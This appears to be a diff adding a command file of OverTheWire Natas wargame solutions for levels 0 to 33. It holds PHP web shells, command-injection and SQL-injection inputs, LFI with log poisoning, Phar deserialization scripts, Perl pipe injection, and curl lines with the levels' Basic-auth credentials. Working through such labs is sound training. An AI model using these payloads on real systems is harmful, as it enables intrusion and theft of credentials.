@@ -1,0 +1,310 @@
+# OverTheWire Natas Walkthrough Commands (Levels 0-33)
+# Based on the provided LearnHacking.io walkthrough document.
+# Note: Many levels are solved using browser Dev Tools or Burp Suite,
+# which don't have direct terminal commands listed here unless curl is used.
+# Passwords and specific auth tokens are taken from the walkthrough text.
+
+# Level 0 -> 1
+# No terminal commands used. Solution involves viewing page source in the browser.
+
+# Level 1 -> 2
+# No terminal commands used. Solution involves viewing page source using Dev Tools.
+
+# Level 2 -> 3
+# No terminal commands used. Solution involves browser navigation to discover directory listing and files.
+# 1. Navigate to http://natas2.natas.labs.overthewire.org/files/
+# 2. Navigate to http://natas2.natas.labs.overthewire.org/files/users.txt
+
+# Level 3 -> 4
+# No terminal commands used. Solution involves browsing to robots.txt and the disallowed directory.
+# 1. Navigate to http://natas3.natas.labs.overthewire.org/robots.txt
+# 2. Navigate to http://natas3.natas.labs.overthewire.org/s3cr3t/
+# 3. Navigate to http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+
+# Level 4 -> 5
+# Using curl to spoof the Referer header.
+# Initial test command (copied from Dev Tools, potentially simplified):
+curl 'http://natas4.natas.labs.overthewire.org/' \
+  -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va'
+
+# Command to solve the level by adding the Referer header:
+curl 'http://natas4.natas.labs.overthewire.org/' \
+  -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' \
+  -H 'Referer: http://natas5.natas.labs.overthewire.org/'
+
+# Level 5 -> 6
+# Using curl to modify the 'loggedin' cookie value.
+# Initial test command (copied from Dev Tools, simplified):
+curl 'http://natas5.natas.labs.overthewire.org/' \
+  -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' \
+  -H 'Cookie: loggedin=0'
+
+# Command to solve the level by changing loggedin=0 to loggedin=1:
+curl 'http://natas5.natas.labs.overthewire.org/' \
+  -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' \
+  -H 'Cookie: loggedin=1'
+
+# Level 6 -> 7
+# Solution involves finding a secret file via browser navigation and submitting it via a form.
+# Optional: View the POST request using curl after submitting the form in the browser.
+curl 'http://natas6.natas.labs.overthewire.org/' \
+  -H 'Authorization: Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx' \
+  --data-raw 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
+
+# Level 7 -> 8
+# Solution involves Local File Inclusion (LFI) via browser URL manipulation.
+# Navigate to: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+# Level 8 -> 9
+# Solution involves reversing PHP encoding functions.
+# Can be done using an online PHP compiler/sandbox or CyberChef.
+# Example PHP code snippet for online compiler (or save to file and run `php filename.php`):
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+echo base64_decode(strrev(hex2bin($encodedSecret)));
+?>
+
+# Level 9 -> 10
+# Solution involves command injection via the web form.
+# Input into the search form: ; ls;
+# Input into the search form to get the flag: ; cat /etc/natas_webpass/natas9;
+# (The walkthrough uses natas9 in the example, assuming typo and should be natas10 for the flag)
+# Input into the search form to get the flag (corrected): ; cat /etc/natas_webpass/natas10;
+
+# Level 10 -> 11
+# Solution involves command injection bypassing filters, using grep's ability to search multiple files.
+# Input into the search form: .* /etc/natas_webpass/natas11
+
+# Level 11 -> 12
+# Solution involves XOR key recovery and cookie manipulation.
+# Step 1: Use PHP sandbox/compiler to get base64 of JSON without XOR.
+<?php
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+echo base64_encode(json_encode($defaultdata));
+?>
+# Step 2: Use CyberChef or similar tool to XOR the original cookie with the result from Step 1 to find the key.
+# Step 3: Use CyberChef or similar tool to create the new cookie value.
+# (No direct terminal commands, relies on external tools/web interfaces and browser Dev Tools cookie manipulation)
+
+# Level 12 -> 13
+# Solution involves uploading a PHP web shell and bypassing client-side filename changes.
+# Step 1: Create shell.php
+# <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+# Step 2: Upload shell.php, use Dev Tools to change filename back to .php before submitting.
+# Step 3: Navigate to the uploaded shell URL and execute commands via the 'e' parameter.
+# Example: http://natas12.natas.labs.overthewire.org/upload/<randomstring>.php?e=ls
+# Example: http://natas12.natas.labs.overthewire.org/upload/<randomstring>.php?e=cat%20/etc/natas_webpass/natas13
+
+# Level 13 -> 14
+# Solution involves bypassing file type check (exif_imagetype) by prepending magic bytes to a web shell.
+# Step 1: Create new-shell.php with magic bytes (e.g., GIF87a) prepended.
+# GIF87a <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+# Optional command line method to prepend hex bytes (e.g., for JPG FF D8 FF EE):
+# (echo -n -e '\xff\xd8\xff\xee'; cat shell.php) > new-shell.php
+# Step 2: Upload new-shell.php, use Dev Tools to change filename back to .php before submitting.
+# Step 3: Navigate to the uploaded shell URL and execute commands.
+# Example: http://natas13.natas.labs.overthewire.org/upload/<randomstring>.php?e=ls
+# Example: http://natas13.natas.labs.overthewire.org/upload/<randomstring>.php?e=cat%20/etc/natas_webpass/natas14
+
+# Level 14 -> 15
+# Solution involves basic SQL injection.
+# Input into username field: " OR 1=1 -- 
+# (Ensure space after --)
+# Password field can be left blank.
+
+# Level 15 -> 16
+# Solution involves Blind SQL injection (boolean-based). Requires a script.
+# Command to run the Python script provided in the walkthrough:
+python blind-sql.py
+# (Assumes the script is saved as blind-sql.py and python is installed)
+
+# Level 16 -> 17
+# Solution involves Blind Command Injection. Requires scripts.
+# Command to run the first script (find valid characters):
+python valid-chars.py
+# Command to run the second script (find first part of password):
+python solver-first-half.py
+# Command to run the third script (find second part of password):
+python solver-second-half.py
+# Command to run the combined script:
+python solver-full.py
+# (Assumes scripts are saved with these names and python is installed)
+
+# Level 17 -> 18
+# Solution involves Blind SQL injection (time-based). Requires a script.
+# Command to run the Python script provided in the walkthrough:
+python time-based-sql.py
+# (Assumes the script is saved as time-based-sql.py or similar, and python is installed)
+
+# Level 18 -> 19
+# Solution involves bruteforcing PHPSESSID. Requires a script.
+# Optional: Test single PHPSESSID with curl (copied from Dev Tools, simplified):
+curl 'http://natas18.natas.labs.overthewire.org/index.php' \
+    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
+    -H 'Cookie: PHPSESSID=515' \
+    --insecure
+# Command to run the Python bruteforce script:
+python bruteforce-phpsessid.py
+# (Assumes the script is saved as bruteforce-phpsessid.py or similar, and python is installed)
+
+# Level 19 -> 20
+# Solution involves bruteforcing hex-encoded PHPSESSID. Requires a script.
+# Command to run the Python bruteforce script:
+python bruteforce-hex-phpsessid.py
+# (Assumes the script is saved as bruteforce-hex-phpsessid.py or similar, and python is installed)
+
+# Level 20 -> 21
+# Solution involves exploiting custom session handling via newline injection in Burp Suite Repeater.
+# No direct terminal commands. Requires manual manipulation in Burp Suite.
+
+# Level 21 -> 22
+# Solution involves session fixation across subdomains using Burp Suite Repeater.
+# No direct terminal commands. Requires manual manipulation in Burp Suite.
+
+# Level 22 -> 23
+# Solution involves bypassing a redirect by intercepting the request before the redirect occurs.
+# Using curl (without -L to follow redirects):
+curl -H 'Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==' http://natas22.natas.labs.overthewire.org/index.php?revelio
+# Alternative: Use Burp Suite to capture the 302 response.
+
+# Level 23 -> 24
+# Solution involves bypassing PHP strstr comparison with type juggling.
+# Input into the password form: 11iloveyou
+# (Or any number > 10 followed by "iloveyou")
+
+# Level 24 -> 25
+# Solution involves bypassing PHP strcmp comparison with type juggling (Array bypass).
+# Navigate directly to the URL:
+# http://natas24.natas.labs.overthewire.org/?passwd[]=anyvalue
+
+# Level 25 -> 26
+# Solution involves Local File Inclusion (LFI) bypass and Log Poisoning via User-Agent.
+# Step 1: Use LFI bypass to view log file (replace PHPSESSID):
+# http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<YOUR_PHPSESSID>.log
+# Step 2: Use Burp Suite Repeater to modify the request from Step 1. Change the User-Agent header to:
+# <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
+# Step 3: Send the modified request in Burp. The response will contain the flag.
+
+# Level 26 -> 27
+# Solution involves Phar Deserialization via cookie manipulation.
+# Step 1: Create the PHP script (e.g., generate_phar.php) to create the malicious Phar file.
+<?php
+class Logger{
+    private $logFile;
+    private $exitMsg;
+    function __construct(){
+        // Use a unique filename based on your session or a known value if possible
+        // The example uses a hardcoded session ID - replace if necessary
+        $this->logFile = "/var/www/natas/natas26/img/natas26_q82optt5977ar7gsc8bthe0123.php"; 
+        $this->exitMsg = "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
+    }
+}
+$phar = new Phar('natas26.phar'); // Output filename
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text'); // Dummy file
+$phar->setStub('<?php __HALT_COMPILER(); ?>'); // Required stub
+$object = new Logger();
+// $object->data = 'rips'; // This line seems unnecessary based on the class structure
+$phar->setMetadata($object); // Set the Executor object as metadata
+$phar->stopBuffering();
+?>
+# Step 2: Run the PHP script to generate the .phar file (requires phar.readonly=0 in php.ini or via -d flag).
+php -d phar.readonly=0 generate_phar.php
+# Step 3: Use browser Dev Tools to set the 'drawing' cookie to the base64-encoded content of natas26.phar.
+# (Get base64 content: `base64 natas26.phar` or use CyberChef)
+# Step 4: Refresh the Natas 26 page.
+# Step 5: Navigate to the logFile path specified in the script (e.g., http://natas26.natas.labs.overthewire.org/img/natas26_q82optt5977ar7gsc8bthe0123.php)
+
+# Level 27 -> 28
+# Solution involves exploiting MySQL username truncation and lack of unique constraint.
+# Requires Burp Suite to send crafted POST request.
+# Step 1: Calculate padding length: 64 - len('natas28') = 57 spaces.
+# Step 2: Send POST request via Burp Repeater with:
+#   username=natas28<57 spaces>x
+#   password=anypassword 
+# Step 3: Login normally via the web form with username 'natas28' and the password used in Step 2.
+
+# Level 28 -> 29
+# Solution involves exploiting AES ECB block mode vulnerability (replay/reordering attack).
+# Requires manual manipulation of encrypted query strings, likely using Burp Suite and CyberChef.
+# Step 1: Determine block size (found to be 16 bytes / 22 base64 chars).
+# Step 2: Identify known good header, trailer, dummy block, and known bad block (when ' is escaped).
+# Step 3: Craft SQL injection payload (e.g., ' UNION SELECT ALL password FROM users; -- ).
+# Step 4: Send initial request with padding + payload (e.g., AAAAAAAAA' UNION SELECT ALL password FROM users; -- ).
+# Step 5: Extract the encrypted payload part from the resulting URL query.
+# Step 6: Reconstruct the final query: [header][dummy block][encrypted payload][trailer].
+# Step 7: Base64 encode, then URL encode the reconstructed query.
+# Step 8: Send the final encoded query via the browser URL.
+# (No single terminal command captures this multi-step process involving external tools)
+
+# Level 29 -> 30
+# Solution involves Perl command injection bypass ('natas' filter) using wildcards and null termination.
+# Test basic command injection:
+# http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+# View source code (base64 encoded):
+# http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%20|%20base64%00
+# Get the flag using wildcard bypass:
+# http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00
+
+# Level 30 -> 31
+# Solution involves Perl DBI::quote SQL injection bypass using array parameters. Requires a script.
+# Command to run the Python script provided in the walkthrough:
+python perl-dbi-sqli.py
+# (Assumes the script is saved as perl-dbi-sqli.py or similar, and python is installed)
+
+# Level 31 -> 32
+# Solution involves Perl file upload vulnerability ("Perl Jam 2 Pinnacle Attack"). Requires Burp Suite.
+# Step 1: Upload a dummy CSV file (e.g., test.csv).
+# Step 2: Send the upload request to Burp Repeater.
+# Step 3: Modify the request:
+#    - Add a new form-data part *before* the CSV part:
+#      Content-Disposition: form-data; name="file"
+#      ARGV
+#    - Append the command to the URL, ending with '|' and URL-encoded:
+#      /index.pl?cat%20/etc/natas_webpass/natas32%20|
+# Step 4: Send the modified request. The flag will be in the response.
+
+# Level 32 -> 33
+# Solution is identical to Level 31, but requires executing a specific program. Requires Burp Suite.
+# Step 1: Upload a dummy CSV file (e.g., test.csv).
+# Step 2: Send the upload request to Burp Repeater.
+# Step 3: Modify the request:
+#    - Add a new form-data part *before* the CSV part:
+#      Content-Disposition: form-data; name="file"
+#      ARGV
+#    - Append the command to the URL, ending with '|' and URL-encoded:
+#      /index.pl?./getpassword%20|
+# Step 4: Send the modified request. The flag will be in the response.
+
+# Level 33 -> 34 (Final Level)
+# Solution involves Phar Deserialization to bypass MD5 check. Requires generating Phar file and using Burp Suite.
+# Step 1: Create PHP script (natas33.php) to generate the malicious Phar archive.
+<?php
+class Executor{
+    // Filename of the shell we will upload separately
+    private $filename = "shell.php"; 
+    // Set signature to True for loose comparison bypass
+    private $signature = True; 
+    private $init = false; // Needs to be present based on original class
+}
+// Output Phar filename
+$phar = new Phar('natas33.phar'); 
+$phar->startBuffering();
+// Add a dummy file required by Phar structure
+$phar->addFromString('test.txt', 'text'); 
+// Required stub
+$phar->setStub('<?php __HALT_COMPILER(); ?>'); 
+// Create the malicious Executor object
+$object = new Executor();
+// Set the Executor object as metadata
+$phar->setMetadata($object); 
+$phar->stopBuffering();
+?>
+# Step 2: Create the shell file (shell.php).
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+# Step 3: Generate the Phar file using PHP CLI (disable readonly).
+php -d phar.readonly=0 natas33.php
+# Step 4: Use Burp Suite Repeater to upload shell.php, modifying the filename in the request to 'shell.php'. Send request.
+# Step 5: Use Burp Suite Repeater to upload natas33.phar, modifying the filename in the request to 'natas33.phar'. Send request.
+# Step 6: Modify the request from Step 5. Change the filename to 'phar://natas33.phar/test.txt'. Send request.
+# The response to the request in Step 6 will contain the final flag.
